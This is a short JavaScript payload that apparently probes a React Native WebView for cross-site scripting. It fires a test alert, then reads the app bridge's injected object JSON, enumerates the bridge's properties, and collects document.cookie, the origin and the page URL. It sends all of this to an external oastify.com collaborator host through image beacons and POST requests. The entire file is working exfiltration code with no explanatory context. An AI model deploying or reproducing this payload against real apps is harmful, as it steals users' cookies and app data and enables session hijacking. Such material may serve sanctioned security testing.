alert('test 3');

var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

function beacon(path, data) {
    var img = new Image();
    img.src = EXFIL + '/' + path + '?d=' + encodeURIComponent(typeof data === 'string' ? data : JSON.stringify(data));
}

function beaconPost(path, data) {
    try {
        var x = new XMLHttpRequest();
        x.open('POST', EXFIL + '/' + path, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(typeof data === 'string' ? data : JSON.stringify(data));
    } catch(e) {}
}

beacon('v5-loaded', 'start');

(function() {
    var info = {};
    try { info.injectedObjectJson = window.ReactNativeWebView.injectedObjectJson(); } catch(e) { info.injectedObjectJson = 'error:' + e.message; }
    try { info.landingConstructor = window.ReactNativeWebView.landingConstructor; } catch(e) { info.landingConstructor = 'error:' + e.message; }

    // Enumerate all properties of ReactNativeWebView
    var props = [];
    try {
        for (var k in window.ReactNativeWebView) {
            props.push(k + ':' + typeof window.ReactNativeWebView[k]);
        }
    } catch(e) {}
    info.rnwvProps = props.join(',');

    // Check document.cookie access
    try { info.cookie = document.cookie; } catch(e) { info.cookieError = e.message; }

    // Check origin
    info.origin = window.origin;
    info.location = window.location.href;

    beaconPost('v5-phase0-bridge', info);
})();
